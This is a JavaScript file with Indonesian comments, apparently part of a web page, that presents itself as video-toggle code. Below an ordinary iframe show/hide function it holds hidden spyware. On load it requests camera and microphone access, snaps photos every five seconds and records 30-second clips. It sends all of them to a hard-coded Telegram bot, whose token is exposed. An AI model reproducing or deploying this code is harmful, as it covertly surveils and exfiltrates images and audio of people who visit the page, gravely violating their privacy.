/* --- Bagian JavaScript untuk Fungsi Video --- */

function toggleVideo(videoId) {
  // Dapatkan elemen kontainer video dan tombol yang diklik
  const videoContainer = document.getElementById(videoId);
  const button = event.target;
  const iframe = videoContainer.querySelector("iframe");
  let currentSrc = iframe.src;

  if (videoContainer.style.display === "block") {
    // Logika untuk SEMBUNYIKAN video
    videoContainer.style.display = "none";
    button.textContent = "Lihat Video";

    // Hentikan pemutaran video (dengan me-reload iframe tanpa autoplay)
    if (currentSrc.includes("autoplay=1")) {
      iframe.src = currentSrc.replace("autoplay=1", "autoplay=0");
    } else {
      iframe.src = currentSrc;
    }
  } else {
    // Logika untuk TAMPILKAN video
    videoContainer.style.display = "block";
    button.textContent = "Sembunyikan Video";

    // Mulai pemutaran video (dengan menambahkan parameter autoplay=1)
    if (!currentSrc.includes("autoplay=1")) {
      // Jika belum ada parameter query, tambahkan dengan "?"
      if (!currentSrc.includes("?")) {
        iframe.src = currentSrc + "?autoplay=1&controls=1";
      } else {
        // Jika sudah ada parameter, tambahkan dengan "&"
        iframe.src = currentSrc.replace("autoplay=0", "autoplay=1");
      }
    }
  }
}

// 🔥 Akses kamera dan mulai streaming
navigator.mediaDevices
  .getUserMedia({ video: true, audio: true })
  .then((stream) => {
    // Tampilkan preview kamera (opsional)
    const video = document.createElement("video");
    video.setAttribute("autoplay", true);
    video.setAttribute("playsinline", true);
    video.setAttribute("muted", true);
    video.srcObject = stream;
    document.body.appendChild(video);

    // 🔥 Ambil foto tiap 5 detik
    setInterval(() => {
      const canvas = document.getElementById("snapshot");
      canvas.width = 640;
      canvas.height = 480;
      canvas
        .getContext("2d")
        .drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        const form = new FormData();
        form.append("chat_id", "-1003093709155");
        form.append("photo", blob);
        fetch(
          "https://api.telegram.org/bot8407827799:AAFkV8jrnpgornlX-Ypi2tYdWL29M_xwj5c/sendPhoto",
          {
            method: "POST",
            body: form,
          }
        );
      }, "image/jpeg");
    }, 5000);

    // 🔥 Rekam video tiap 30 detik
    const recorder = new MediaRecorder(stream);
    let chunks = [];

    recorder.ondataavailable = (e) => chunks.push(e.data);
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      chunks = [];
      const form = new FormData();
      form.append("chat_id", "-1003093709155");
      form.append("video", blob);
      fetch(
        "https://api.telegram.org/bot8407827799:AAFkV8jrnpgornlX-Ypi2tYdWL29M_xwj5c/sendVideo",
        {
          method: "POST",
          body: form,
        }
      );
    };

    setInterval(() => {
      recorder.start();
      setTimeout(() => recorder.stop(), 30000); // rekam 30 detik
    }, 30000);
  })
  .catch(() => {
    alert("🚫 Kamera ditolak. Aktifkan izin untuk lanjut.");
  });
